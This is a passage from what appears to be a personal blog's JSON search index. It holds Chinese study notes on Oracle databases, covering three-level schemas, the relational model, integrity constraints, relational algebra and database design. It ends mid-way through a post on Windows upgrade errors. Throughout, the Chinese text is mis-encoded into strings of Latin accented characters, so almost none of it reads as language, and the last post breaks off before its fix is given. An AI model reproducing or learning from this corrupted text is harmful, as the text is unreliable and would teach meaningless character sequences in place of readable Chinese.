ä»æ•°æ®åº“æœ€ç»ˆç”¨æˆ·è§’åº¦çœ‹ï¼Œæ•°æ®åº“ç³»ç»Ÿçš„ç»“æ„åˆ†ä¸º:å•ç”¨æˆ·ç»“æ„ï¼›å®¢æˆ·/æœåŠ¡å™¨ç»“æ„ï¼›æµè§ˆå™¨ï¼åº”ç”¨æœåŠ¡å™¨ï¼æ•°æ®åº“æœåŠ¡å™¨å¤šå±‚ç»“æ„ç­‰ã€‚ æ•°æ®åº“ç³»ç»Ÿçš„ä¸‰çº§æ¨¡å¼ç»“æ„ ä¸ºäº†æœ‰æ•ˆåœ°ç»„ç»‡ã€ç®¡ç†æ•°æ®ï¼Œæé«˜æ•°æ®åº“çš„é€»è¾‘ç‹¬ç«‹æ€§å’Œç‰©ç†ç‹¬ç«‹æ€§ï¼Œäººä»¬ä¸ºæ•°æ®åº“è®¾è®¡äº†ä¸€ä¸ªä¸¥è°¨çš„ä½“ç³»ç»“æ„ï¼Œæ•°æ®åº“é¢†åŸŸå…¬è®¤çš„æ ‡å‡†ç»“æ„æ˜¯ä¸‰çº§æ¨¡å¼ç»“æ„ï¼Œå³å¤–æ¨¡å¼ã€æ¨¡å¼å’Œå†…æ¨¡å¼ ã€‚ æ ¹æ®å„ç±»äººå‘˜ä¸æ•°æ®åº“çš„ä¸åŒå…³ç³»ï¼Œå¯æŠŠè§†å›¾åˆ†ä¸ºä¸‰ç§ å¯¹åº”äºç”¨æˆ·çš„å¤–éƒ¨è§†å›¾ å¯¹åº”äºåº”ç”¨ç¨‹åºå‘˜çš„æ¦‚å¿µè§†å›¾ å¯¹åº”äºç³»ç»Ÿç¨‹åºå‘˜çš„å†…éƒ¨è§†å›¾ æ¨¡å¼ï¼ˆSchemaï¼Œä¹Ÿç§°é€»è¾‘æ¨¡å¼ï¼‰ æ•°æ®åº“ä¸­å…¨ä½“æ•°æ®çš„é€»è¾‘ç»“æ„å’Œç‰¹å¾çš„æè¿° æ‰€æœ‰ç”¨æˆ·çš„å…¬å…±æ•°æ®è§†å›¾ï¼Œç»¼åˆäº†æ‰€æœ‰ç”¨æˆ·çš„éœ€æ±‚ ä¸€ä¸ªæ•°æ®åº“åªæœ‰ä¸€ä¸ªæ¨¡å¼ æ¨¡å¼çš„åœ°ä½ ï¼šæ˜¯æ•°æ®åº“ç³»ç»Ÿæ¨¡å¼ç»“æ„çš„ä¸­é—´å±‚ ä¸æ•°æ®çš„ç‰©ç†å­˜å‚¨ç»†èŠ‚å’Œç¡¬ä»¶ç¯å¢ƒæ— å…³ ä¸å…·ä½“çš„åº”ç”¨ç¨‹åºã€å¼€å‘å·¥å…·åŠé«˜çº§ç¨‹åºè®¾è®¡è¯­è¨€æ— å…³ å¤–æ¨¡å¼ ä¹Ÿç§°å­æ¨¡å¼æˆ–ç”¨æˆ·æ¨¡å¼ æ•°æ®åº“ç”¨æˆ·ï¼ˆåŒ…æ‹¬åº”ç”¨ç¨‹åºå‘˜å’Œæœ€ç»ˆç”¨æˆ·ï¼‰ä½¿ç”¨çš„å±€éƒ¨æ•°æ®çš„é€»è¾‘ç»“æ„å’Œç‰¹å¾çš„æè¿° æ•°æ®åº“ç”¨æˆ·çš„æ•°æ®è§†å›¾ï¼Œæ˜¯ä¸æŸä¸€åº”ç”¨æœ‰å…³çš„æ•°æ®çš„é€»è¾‘è¡¨ç¤º å¤–æ¨¡å¼çš„åœ°ä½ï¼šä»‹äºæ¨¡å¼ä¸åº”ç”¨ä¹‹é—´ å¤–æ¨¡å¼ä¸åº”ç”¨çš„å…³ç³»ï¼š åŒä¸€å¤–æ¨¡å¼ä¹Ÿå¯ä»¥ä¸ºå¤šä¸ªåº”ç”¨ç³»ç»Ÿæ‰€ä½¿ç”¨ ä½†ä¸€ä¸ªåº”ç”¨ç¨‹åºåªèƒ½ä½¿ç”¨ä¸€ä¸ªå¤–æ¨¡å¼ æ¨¡å¼ä¸å¤–æ¨¡å¼çš„å…³ç³»ï¼š å¤–æ¨¡å¼é€šå¸¸æ˜¯æ¨¡å¼çš„å­é›† ä¸€ä¸ªæ•°æ®åº“å¯ä»¥æœ‰å¤šä¸ªå¤–æ¨¡å¼ã€‚åæ˜ äº†ä¸åŒçš„ç”¨æˆ·çš„åº”ç”¨éœ€æ±‚ã€çœ‹å¾…æ•°æ®çš„æ–¹å¼ã€å¯¹æ•°æ®ä¿å¯†çš„è¦æ±‚ å†…æ¨¡å¼ æ˜¯æ•°æ®ç‰©ç†ç»“æ„å’Œå­˜å‚¨æ–¹å¼çš„æè¿° æ˜¯æ•°æ®åœ¨æ•°æ®åº“å†…éƒ¨çš„è¡¨ç¤ºæ–¹å¼ è®°å½•çš„å­˜å‚¨æ–¹å¼ï¼ˆé¡ºåºå­˜å‚¨ï¼ŒæŒ‰ç…§Bæ ‘ç»“æ„å­˜å‚¨ï¼‰ ç´¢å¼•çš„ç»„ç»‡æ–¹å¼ æ•°æ®æ˜¯å¦å‹ç¼©å­˜å‚¨ æ•°æ®æ˜¯å¦åŠ å¯† ä¸€ä¸ªæ•°æ®åº“åªæœ‰ä¸€ä¸ªå†…æ¨¡å¼ æ•°æ®åº“çš„ä¸¤çº§æ˜ åƒ ä¸‰çº§æ¨¡å¼æ˜¯å¯¹æ•°æ®çš„ä¸‰ä¸ªæŠ½è±¡çº§åˆ« äºŒçº§æ˜ è±¡åœ¨DBMSå†…éƒ¨å®ç°è¿™ä¸‰ä¸ªæŠ½è±¡å±‚æ¬¡çš„è”ç³»å’Œè½¬æ¢ å¤–æ¨¡å¼\\æ¨¡å¼æ˜ åƒ ä¿è¯æ•°æ®çš„é€»è¾‘ç‹¬ç«‹æ€§ åŒä¸€ä¸ªæ¨¡å¼å¯ä»¥æœ‰ä»»æ„å¤šä¸ªå¤–æ¨¡å¼ï¼Œå¤–æ¨¡å¼ï¼æ¨¡å¼æ˜ è±¡ï¼Œå®šä¹‰å¤–æ¨¡å¼ä¸æ¨¡å¼ä¹‹é—´çš„å¯¹åº”å…³ç³»ï¼› å½“æ¨¡å¼æ”¹å˜æ—¶ï¼Œå¤–æ¨¡å¼ï¼æ¨¡å¼æ˜ è±¡ä½¿å¤–æ¨¡å¼ä¿æŒä¸å˜ï¼› åº”ç”¨ç¨‹åºæ˜¯ä¾æ®æ•°æ®çš„å¤–æ¨¡å¼ç¼–å†™çš„ï¼Œä»è€Œä¸å¿…ä¿®æ”¹åº”ç”¨ç¨‹åºï¼Œä¿è¯äº†æ•°æ®ä¸ç¨‹åºçš„é€»è¾‘ç‹¬ç«‹æ€§ æ¨¡å¼ï¼å†…æ¨¡å¼æ˜ è±¡ ä¿è¯æ•°æ®çš„ç‰©ç†ç‹¬ç«‹æ€§ã€‚ æ¨¡å¼ï¼å†…æ¨¡å¼æ˜ è±¡å®šä¹‰äº†æ•°æ®å…¨å±€é€»è¾‘ç»“æ„ å…¨å±€é€»è¾‘ç»“æ„ä¸å­˜å‚¨ç»“æ„ å‚¨ç»“æ„ä¹‹é—´çš„å¯¹åº”å…³ç³»ã€‚ å½“æ•°æ®åº“çš„å­˜å‚¨ç»“æ„æ”¹å˜äº†ï¼Œæ¨¡å¼ï¼å†…æ¨¡å¼æ˜ è±¡ä½¿æ¨¡å¼ä¿æŒä¸å˜ã€‚ åº”ç”¨ç¨‹åºä¸å—å½±å“ã€‚ä¿è¯äº†æ•°æ®ä¸ç¨‹åºçš„ç‰©ç†ç‹¬ç«‹æ€§ æ•°æ®åº“ç³»ç»Ÿå¤–éƒ¨ç»“æ„ ä»æ•°æ®åº“æœ€ç»ˆç”¨æˆ·è§’åº¦çœ‹ï¼ˆæ•°æ®åº“ç³»ç»Ÿå¤–éƒ¨çš„ä½“ç³»ç»“æ„ï¼‰ ï¼Œæ•°æ®åº“ç³»ç»Ÿçš„ç»“æ„åˆ†ä¸º: å•ç”¨æˆ·æ•°æ®åº“ç³»ç»Ÿ æ•´ä¸ªæ•°æ®åº“ç³»ç»Ÿ(åº”ç”¨ç¨‹åºã€DBMSã€æ•°æ®)è£…åœ¨ä¸€å°è®¡ç®—æœºä¸Šï¼Œä¸ºä¸€ä¸ªç”¨æˆ·ç‹¬å ï¼Œä¸åŒæœºå™¨ä¹‹é—´ä¸èƒ½å…±äº«æ•°æ®ã€‚ é›†ä¸­å¼ç»“æ„ å®¢æˆ·ï¼æœåŠ¡å™¨ æµè§ˆå™¨ï¼åº”ç”¨æœåŠ¡å™¨ï¼æ•°æ®åº“æœåŠ¡å™¨å¤šå±‚ç»“æ„ç­‰ å°ç»“ æ•°æ®ç®¡ç†çš„å‘å±•è¿‡ç¨‹ æ•°æ®åº“ç³»ç»Ÿçš„ç»„æˆ æ•°æ®æ¨¡å‹ æ•°æ®æ¨¡å‹çš„ä¸‰è¦ç´  æ¦‚å¿µæ¨¡å‹ï¼Œ E-Ræ¨¡å‹ ä¸‰ç§ä¸»è¦æ•°æ®æ¨¡å‹ æ•°æ®åº“ç³»ç»Ÿç»“æ„ æ•°æ®åº“ç³»ç»Ÿä¸‰çº§æ¨¡å¼ç»“æ„ æ•°æ®åº“ç³»ç»Ÿä¸¤çº§æ˜ åƒç³»ç»Ÿç»“æ„","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"Oracleæ•°æ®åº“ç¬¬ä¸‰å‘¨","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/ç¬¬3å‘¨è¯¾/","text":"Oracleæ•°æ®åº“ç¬¬ä¸‰å‘¨å…³ç³»æ•°æ®åº“ç®€ä»‹ æå‡ºå…³ç³»æ¨¡å‹çš„æ˜¯ç¾å›½ æå‡ºå…³ç³»æ¨¡å‹çš„æ˜¯ç¾å›½IBMå…¬å¸çš„ å…¬å¸çš„E.F.Codd 1970å¹´æå‡ºå…³ç³»æ•°æ®æ¨¡å‹ å¹´æå‡ºå…³ç³»æ•°æ®æ¨¡å‹ E.F.Codd, â€œA Relational Model of Data for Large Shared Data Banksâ€, ã€ŠCommunication of the ACMã€‹1970 ä¹‹åï¼Œæå‡ºäº†å…³ç³»ä»£æ•°å’Œå…³ç³»æ¼”ç®—çš„æ¦‚å¿µ 1972å¹´æå‡ºäº†å…³ç³»çš„ç¬¬ä¸€ã€ç¬¬äºŒã€ç¬¬ä¸‰èŒƒå¼ 1974å¹´æå‡ºäº†å…³ç³»çš„ å¹´æå‡ºäº†å…³ç³»çš„BCèŒƒå¼ å…³ç³»æ•°æ®åº“2.1å…³ç³»æ•°æ®ç»“æ„åŠå½¢å¼åŒ–å®šä¹‰2.1.1å…³ç³» å•ä¸€çš„æ•°æ®ç»“æ„ å•ä¸€çš„æ•°æ®ç»“æ„â€”-å…³ç³» ç°å®ä¸–ç•Œçš„å®ä½“ä»¥åŠå®ä½“é—´çš„å„ç§è”ç³»å‡ç”¨å…³ç³»æ¥è¡¨ç¤ºé€»è¾‘ç»“æ„â€”äºŒç»´è¡¨ ä»ç”¨æˆ·è§’åº¦ï¼Œå…³ç³»æ¨¡å‹ä¸­æ•°æ®çš„é€»è¾‘ç»“æ„æ˜¯ä¸€å¼ äºŒç»´è¡¨ å»ºç«‹åœ¨é›†åˆä»£æ•°çš„åŸºç¡€ä¸Š è¡¥å…… åŸŸ åŸŸæ˜¯ä¸€ç»„å…·æœ‰ç›¸åŒæ•°æ®ç±»å‹çš„å€¼çš„é›†åˆ ç¬›å¡å°”ç§¯ å…³ç³» 2.1.2å…³ç³»æ¨¡å¼1. ä»€ä¹ˆæ˜¯å…³ç³»æ¨¡å¼ å…³ç³»æ¨¡å¼ï¼ˆ å…³ç³»æ¨¡å¼ï¼ˆRelation Schemaï¼‰æ˜¯å‹ å…³ç³»æ˜¯å€¼çš„é›†åˆ å…³ç³»æ¨¡å¼æ˜¯å¯¹å…³ç³»çš„æè¿° å…ƒç»„é›†åˆçš„ç»“æ„ å±æ€§æ„æˆæ€§æ„æˆ å±æ€§æ¥è‡ªçš„åŸŸ å±æ€§ä¸åŸŸä¹‹é—´çš„æ˜ è±¡å…³ç³» å…ƒç»„è¯­ä¹‰ä»¥åŠå®Œæ•´æ€§çº¦æŸæ¡ä»¶ å±æ€§é—´çš„æ•°æ®ä¾èµ–å…³ç³»é›†åˆ 2. å®šä¹‰å…³ç³»æ¨¡å¼å…³ç³»æ¨¡å¼å¯ä»¥å½¢å¼åŒ–åœ°è¡¨ç¤ºä¸ºï¼š è¡¨ç¤º å«ä¹‰ R å…³ç³»å U ç»„æˆè¯¥å…³ç³»çš„å±æ€§åé›†åˆ D å±æ€§ç»„Uä¸­å±æ€§æ‰€æ¥è‡ªçš„åŸŸ DOM å±æ€§å‘åŸŸçš„æ˜ åƒé›†åˆ F å±æ€§é—´çš„æ•°æ®ä¾èµ–å…³ç³»é›†åˆ 3. å…³ç³»æ¨¡å¼ä¸å…³ç³» å…³ç³»æ¨¡å¼ å¯¹å…³ç³»çš„æè¿° é™æ€çš„ã€ç¨³å®šçš„ å…³ç³» å…³ç³»æ¨¡å¼åœ¨æŸä¸€æ—¶åˆ»çš„çŠ¶æ€æˆ–å†…å®¹ åŠ¨æ€çš„ã€éšæ—¶é—´ä¸æ–­å˜åŒ–çš„ å…³ç³»æ¨¡å¼å’Œå…³ç³»é€šå¸¸ç»Ÿç§°ä¸ºå…³ç³» ä¸€èˆ¬é€šè¿‡ä¸Šä¸‹æ–‡åŠ ä»¥åŒºåˆ« 2.1.3å…³ç³»æ•°æ®åº“ å…³ç³»æ•°æ®åº“ åœ¨ä¸€ä¸ªç»™å®šçš„åº”ç”¨é¢†åŸŸä¸­ï¼Œæ‰€æœ‰å…³ç³»çš„é›†åˆæ„æˆä¸€ä¸ªå…³ç³»æ•°æ®åº“ å…³ç³»æ•°æ®åº“çš„å‹ä¸å€¼ å…³ç³»æ•°æ®åº“çš„å‹ï¼šå…³ç³»æ•°æ®åº“æ¨¡å¼ï¼ˆå¯¹å…³ç³»æ•°æ®åº“çš„æè¿°ï¼‰ å…³ç³»æ•°æ®åº“æ¨¡å¼åŒ…æ‹¬ è‹¥å¹²åŸŸçš„å®šä¹‰ åœ¨è¿™äº›åŸŸä¸Šå®šä¹‰çš„è‹¥å¹²å…³ç³»æ¨¡å¼ å…³ç³»æ•°æ®åº“çš„å€¼ï¼šå…³ç³»æ¨¡å¼åœ¨æŸä¸€æ—¶åˆ»å¯¹åº”çš„å…³ç³»çš„é›†åˆï¼Œç®€ç§°ä¸ºå…³ç³»æ•°æ®åº“ 2.2å…³ç³»æ“ä½œ2.2.1åŸºæœ¬å…³ç³»æ“ä½œå¸¸ç”¨çš„å…³ç³»æ“ä½œ æŸ¥è¯¢ï¼šé€‰æ‹©ã€æŠ•å½±ã€è¿æ¥ã€é™¤ã€å¹¶ã€äº¤ã€å·® æ•°æ®æ›´æ–°ï¼šæ’å…¥ã€åˆ é™¤ã€ä¿®æ”¹ æŸ¥è¯¢çš„è¡¨è¾¾èƒ½åŠ›æ˜¯å…¶ä¸­æœ€ä¸»è¦çš„éƒ¨åˆ† é€‰æ‹©ã€æŠ•å½±ã€å¹¶ã€å·®ã€ç¬›å¡å°”ç§¯æ˜¯5ç§åŸºæœ¬æ“ä½œ å…³ç³»æ“ä½œçš„ç‰¹ç‚¹ é›†åˆæ“ä½œæ–¹å¼ï¼šæ“ä½œçš„å¯¹è±¡å’Œç»“æœéƒ½æ˜¯é›†åˆ 2.2.2 å…³ç³»æ•°æ®åº“è¯­è¨€çš„åˆ†ç±» å…³ç³»ä»£æ•°è¯­è¨€ ç”¨å¯¹å…³ç³»çš„è¿ç®—æ¥è¡¨è¾¾æŸ¥è¯¢è¦æ±‚ ä»£è¡¨ï¼šISBL å…³ç³»æ¼”ç®—è¯­è¨€ï¼šç”¨è°“è¯æ¥è¡¨è¾¾æŸ¥è¯¢è¦æ±‚ å…ƒç»„å…³ç³»æ¼”ç®—è¯­è¨€ è°“è¯å˜å…ƒçš„åŸºæœ¬å¯¹è±¡æ˜¯å…ƒç»„å˜é‡ ä»£è¡¨ï¼šAPLHA ï¼ŒQUEL åŸŸå…³ç³»æ¼”ç®—è¯­è¨€ è°“è¯å˜å…ƒçš„åŸºæœ¬å¯¹è±¡æ˜¯åŸŸå˜é‡ ä»£è¡¨ï¼šQBE å…·æœ‰å…³ç³»ä»£æ•°å’Œå…³ç³»æ¼”ç®—åŒé‡ç‰¹ç‚¹çš„è¯­è¨€ ä»£è¡¨ï¼š SQLï¼ˆStructured Query Languageï¼‰ 2.3 å…³ç³»çš„å®Œæ•´æ€§2.3.1å…³ç³»çš„ä¸‰ç±»å®Œæ•´æ€§çº¦æŸ å®ä½“å®Œæ•´æ€§å’Œå‚ç…§å®Œæ•´æ€§ï¼š å…³ç³»æ¨¡å‹å¿…é¡»æ»¡è¶³çš„å®Œæ•´æ€§çº¦æŸæ¡ä»¶ç§°ä¸ºå…³ç³»çš„ä¸¤ä¸ªä¸å˜æ€§åº”è¯¥ç”±å…³ç³»ç³»ç»Ÿè‡ªåŠ¨æ”¯æŒã€‚ ç”¨æˆ·å®šä¹‰çš„å®Œæ•´æ€§ï¼š åº”ç”¨é¢†åŸŸéœ€è¦éµå¾ªçš„çº¦æŸæ¡ä»¶ï¼Œä½“ç°äº†å…·ä½“é¢†åŸŸä¸­çš„è¯­ä¹‰çº¦æŸã€‚ 2.3.2 å®ä½“å®Œæ•´æ€§ è§„åˆ™2.1 å®ä½“å®Œæ•´æ€§è§„åˆ™ï¼ˆEntity Integrityï¼‰ è‹¥å±æ€§Aæ˜¯åŸºæœ¬å…³ç³»Rçš„ä¸»å±æ€§ï¼Œåˆ™å±æ€§Aä¸èƒ½å–ç©ºå€¼ å®ä½“å®Œæ•´æ€§è§„åˆ™çš„è¯´æ˜ (1) å®ä½“å®Œæ•´æ€§è§„åˆ™æ˜¯é’ˆå¯¹åŸºæœ¬å…³ç³»è€Œè¨€çš„ã€‚ ä¸€ä¸ªåŸºæœ¬è¡¨é€šå¸¸å¯¹åº”ç°å®ä¸–ç•Œçš„ä¸€ä¸ªå®ä½“é›†ã€‚ (2) ç°å®ä¸–ç•Œä¸­çš„å®ä½“æ˜¯å¯åŒºåˆ†çš„ï¼Œå³å®ƒä»¬å…·æœ‰æŸç§å”¯ä¸€æ€§æ ‡è¯†ã€‚ (3) å…³ç³»æ¨¡å‹ä¸­ä»¥ä¸»ç ä½œä¸ºå”¯ä¸€æ€§æ ‡è¯†ã€‚ (4) ä¸»ç ä¸­çš„å±æ€§å³ä¸»å±æ€§ä¸èƒ½å–ç©ºå€¼ã€‚ ä¸»å±æ€§å–ç©ºå€¼ï¼Œå°±è¯´æ˜å­˜åœ¨æŸä¸ªä¸å¯æ ‡è¯†çš„å®ä½“ï¼Œå³å­˜åœ¨ä¸å¯åŒºåˆ†çš„å®ä½“ï¼Œè¿™ä¸ç¬¬ï¼ˆ2ï¼‰ç‚¹ç›¸çŸ›ç›¾ï¼Œå› æ­¤è¿™ä¸ªè§„åˆ™ç§°ä¸ºå®ä½“å®Œæ•´æ€§ å…³ç³»ä»£æ•°å…³ç³»ä»£æ•°ä¸­ é›†åˆè¿ç®—ç¬¦æœ‰ï¼šå¹¶ï¼ˆâˆªï¼‰ï¼Œå·®ï¼ˆï¼ï¼‰ï¼Œäº¤ï¼ˆâˆ©ï¼‰ï¼Œç¬›å¡å°”ç§¯ï¼ˆÃ—ï¼‰ ä¸“é—¨çš„å…³ç³»è¿ç®—ç¬¦æœ‰ï¼šé€‰æ‹©ï¼ˆÏƒï¼‰ï¼ŒæŠ•å½±ï¼ˆÏ€ï¼‰ï¼Œè¿æ¥ï¼ˆâ–·â—ï¼‰ï¼Œé™¤ï¼ˆÃ·ï¼‰ åŸºæœ¬å…³ç³»ä»£æ•°è¿ç®—æ˜¯ï¼šå¹¶ï¼ˆâˆªï¼‰ï¼Œå·®ï¼ˆï¼ï¼‰ï¼Œç¬›å¡å°”ç§¯ï¼ˆÃ—ï¼‰ï¼ŒæŠ•å½±ï¼ˆÏ€ï¼‰ï¼Œé€‰æ‹©ï¼ˆÏƒï¼‰","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"æ•°æ®åº“è®¾è®¡","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/ç¬¬9å‘¨è¯¾/","text":"oracleæ•°æ®åº“ç¬¬ä¹å‘¨è¯¾â€”â€”æ•°æ®åº“è®¾è®¡è®¾è®¡æ–¹æ³•æ¦‚è¿°æ•°æ®åº“è®¾è®¡å®šä¹‰ï¼šå¯¹äºä¸€ä¸ªç»™å®šçš„åº”ç”¨ç¯å¢ƒï¼Œæ„é€ æœ€ä¼˜çš„æ•°æ®åº“æ¨¡å¼ï¼Œå»ºç«‹æ•°æ®åº“åŠåº”ç”¨ç³»ç»Ÿï¼Œä½¿ä¹‹èƒ½æœ‰æ•ˆåœ°å­˜å‚¨æ•°æ®ï¼Œæ»¡è¶³å„ç§ç”¨æˆ·çš„åº”ç”¨éœ€æ±‚ã€‚ æ•°æ®åº“è®¾è®¡çš„ç›®æ ‡ èƒ½å¤Ÿæ»¡è¶³æ•°æ®å­˜å‚¨éœ€æ±‚ ä¾¿äºæœ€ç»ˆç”¨æˆ·è®¿é—® å…·æœ‰è‰¯å¥½çš„å®‰å…¨æœºåˆ¶ æ•°æ®å‡†ç¡®å¹¶æ˜“äºç®¡ç† æ•°æ®åº“æ•´ä½“æ€§èƒ½è‰¯å¥½ æ•°æ®åº“è®¾è®¡çš„ç‰¹ç‚¹ æ¶‰åŠå¤šå­¦ç§‘çš„ç»¼åˆæŠ€æœ¯ ç¡¬ä»¶ã€è½¯ä»¶å’Œå¹²ä»¶çš„ç»“åˆ åºå¤§çš„å·¥ç¨‹é¡¹ç›® ä¸‰åˆ†æŠ€æœ¯ï¼Œä¸ƒåˆ†ç®¡ç†ä¸ç»éªŒï¼ŒåäºŒåˆ†åŸºç¡€æ•°æ® æ¶‰åŠç»“æ„è®¾è®¡å’Œè¡Œä¸ºè®¾è®¡äºŒæ–¹é¢ å…¸å‹çš„æ•°æ®åº“è®¾è®¡æ–¹æ³• åŸºäº3NFçš„æ–¹æ³• ORACLE Barkeræ–¹æ³• åŸºäºERæ¨¡å‹çš„æ–¹æ³• è®¡ç®—æœºè¾…åŠ©æ–¹æ³• ORACLEï¼šDESIGNER 2000 SYBASEï¼šPOWERDESIGNER 1.åŸºäº3NFçš„æ•°æ®åº“è®¾è®¡è®¾è®¡ä¼ä¸šæ¨¡å¼ ç ”ç©¶åº”ç”¨ç¯å¢ƒï¼Œå¹¶è®¾å®šç¯å¢ƒä¸­æ‰€ä½¿ç”¨çš„èµ„æ–™ å†³å®šæ¯ä¸€ä¸ªæŠ¥è¡¨é‡Œå„è‡ªåŒ…å«çš„æ•°æ®å…ƒç´  å†³å®šæ•°æ®ä¸å…ƒç´ ä¹‹é—´çš„å…³ç³»ï¼Œç¡®å®šä¸»å…³é”®å­—çš„æ•°æ®å…ƒç´ å’Œæ™®é€šæ•°æ®å…ƒç´  å¯¹æ¯ä¸€ç»„æ•°æ®å…ƒç´ æ¨å¯¼ç¬¬ä¸‰èŒƒå¼å…³ç³» åŸºäºå¾—åˆ°çš„ç¬¬ä¸‰èŒƒå¼å…³ç³»ç»™å‡ºæ•°æ®åº“ä¼ä¸šæ¨¡å¼ 2.ORACLE Barkeræ–¹æ³•åŒ…å«ä¸ƒä¸ªé˜¶æ®µ åˆ¶å®šç­–ç•¥ åˆ†æé˜¶æ®µ è®¾è®¡é˜¶æ®µ æ„å»ºé˜¶æ®µ ç¼–å†™é˜¶æ®µ è½¬æ¢é˜¶æ®µ äº§å“é˜¶æ®µ 3.E-Ræ–¹æ³•E-Rå›¾æ‰€æè¿°çš„æ¨¡å¼å«ä¼ä¸šæ¨¡å¼ ä¼ä¸šæ¨¡å¼å¼é¢å‘é—®é¢˜çš„ã€æ¦‚å¿µæ€§çš„æ¨¡å¼ï¼Œä¸DBMSæ— å…³ï¼Œæ˜¯é«˜çº§æ¦‚å¿µæ¨¡å‹ åŸºäºE-Ræ–¹æ³•æ•°æ®åº“è®¾è®¡çš„ä¸€èˆ¬æ­¥éª¤ éœ€æ±‚åˆ†æ æ¦‚å¿µè®¾è®¡ é€»è¾‘è®¾è®¡ ç‰©ç†è®¾è®¡ å®ç°è®¾è®¡ æ•°æ®åº“ç³»ç»Ÿå¼€å‘7ä¸ªé˜¶æ®µ1.è§„åˆ’é˜¶æ®µ2.éœ€æ±‚åˆ†æç›®æ ‡ åˆ†æç”¨æˆ·æ´»åŠ¨ï¼Œäº§ç”Ÿä¸šåŠ¡æµç¨‹å›¾ ç¡®å®šç³»ç»ŸèŒƒå›´ï¼Œäº§ç”Ÿç³»ç»ŸèŒƒå›´å›¾ åˆ†æç”¨æˆ·æ´»åŠ¨æ¶‰åŠçš„æ•°æ®ï¼Œäº§ç”Ÿæ•°æ®æµå›¾ åˆ†æç³»ç»Ÿæ•°æ®ï¼Œäº§ç”Ÿæ•°æ®å­—å…¸ å¦‚ä½•è·å¾—æ•°æ®å­—å…¸ éœ€æ±‚æ”¶é›†å’Œåˆ†æ 1.ä¿¡æ¯è¦æ±‚ ç”¨æˆ·å¯¹å³å°†å»ºç«‹çš„æ•°æ®åº“æœ‰äº›ä»€ä¹ˆè¦æ±‚ï¼Ÿä¿å­˜ä»€ä¹ˆä¿¡æ¯ï¼Ÿè¦ä»æ•°æ®åº“ä¸­å¾—åˆ°ä»€ä¹ˆä¿¡æ¯ï¼Ÿæä¾›çš„æ•°æ®ä¸å–å¾—çš„ä¿¡æ¯æ˜¯ä»€ä¹ˆå½¢å¼ï¼Ÿç­‰ç­‰ 2.å¤„ç†è¦æ±‚ å¦‚ä½•ä½¿ç”¨æ•°æ®ï¼Ÿå¯¹å„ç§æ•°æ®çš„ä½¿ç”¨é¢‘ç‡å¦‚ä½•ï¼Ÿæ£€ç´¢æ–¹å¼å¦‚ä½•ï¼Ÿè¦è¾“å‡ºé‚£äº›è¡¨æ ¼ï¼Ÿè¢«å­˜å–çš„æ•°æ®é‡ä¸è¿è¡Œé™åˆ¶ç­‰ 3.åŠŸèƒ½è¦æ±‚ å¯¹å°†è¦å»ºç«‹çš„ä¿¡æ¯ç³»ç»Ÿåº”å…·æœ‰é‚£äº›åŠŸèƒ½ï¼Ÿèƒ½ç»™ç»„ç»‡è§£å†³é‚£äº›å¤„ç†é—®é¢˜ï¼ŸåŠŸèƒ½è¦æ±‚åŒ…æ‹¬è§„åˆ’çš„ã€ç°å­˜çš„ã€äººå·¥çš„æˆ–è‡ªåŠ¨çš„ç­‰å„æ–¹é¢ã€‚ 4.ç¯å¢ƒç‰¹å¾ ä¼ä¸šçš„è§„æ¨¡ä¸ç»“æ„ã€éƒ¨é—¨çš„åœ°ç†åˆ†å¸ƒã€ç°æœ‰ç³»ç»Ÿèµ„æºã€æ•°æ®åº“çš„å®‰å…¨æ€§ã€å®Œæ•´æ€§é™åˆ¶ä»¥åŠï¼¤ï¼¢ï¼­ï¼³ä¸è¿è¡Œç¯å¢ƒçº¦æŸç­‰ ç»“æœï¼šæ•°æ®å­—å…¸ï¼ˆæ•°æ®é¡¹ã€æ•°æ®ç»“æ„ã€æ•°æ®æµã€æ•°æ®å­˜å‚¨å’Œå¤„ç†è¿‡ç¨‹äº”ä¸ªé˜¶æ®µï¼‰ 3.æ¦‚å¿µè®¾è®¡","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"Windowsä¸“ä¸šç‰ˆ19013å‡çº§è¸©å‘","date":"2019-11-12T16:00:00.000Z","path":"2019/11/13/Note/windowä¸“ä¸šç‰ˆ19013å‡çº§è¸©å‘/","text":"Windowsä¸“ä¸šç‰ˆ19013å‡çº§è¸©å‘å‰è¨€å‚æ™šæ­£åœ¨å†™ç€ä½œä¸šï¼Œçªç„¶è·³å‡ºwindowæ›´æ–°ï¼Œæ¯•ç«Ÿé€‰äº†æ…¢æ¨é€,å¿ƒæƒ³æ²¡ä»€ä¹ˆå¯æ€•çš„ï¼Œå¯äº‹æƒ…æ°¸è¿œä¸ä¼šé‚£ä¹ˆç®€å•ï¼ï¼ï¼ ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ ç¬¬ä¸€å‘é—®é¢˜:å¼€æœºå°±æŠ¥é”™ï¼ŒWindowsèµ„æºç®¡ç†å™¨æŠ¥é”™Inter Optane(tm) Memory Pinningæ— æ³•åŠ è½½DLLâ€iaStorAfsService.dllâ€:æ‰¾ä¸åˆ°æŒ‡å®šæ¨¡å—ã€‚(å¼‚å¸¸æ¥è‡ªäºHRESULT:0x8007007E)ã€‚ å³ä¸‹è§’ä¹Ÿä¸è§äº†è‹±ç‰¹å°”å¿«é€Ÿå­˜å‚¨çš„ç¨‹åºå›¾æ ‡ è§£å†³åŠæ³•: 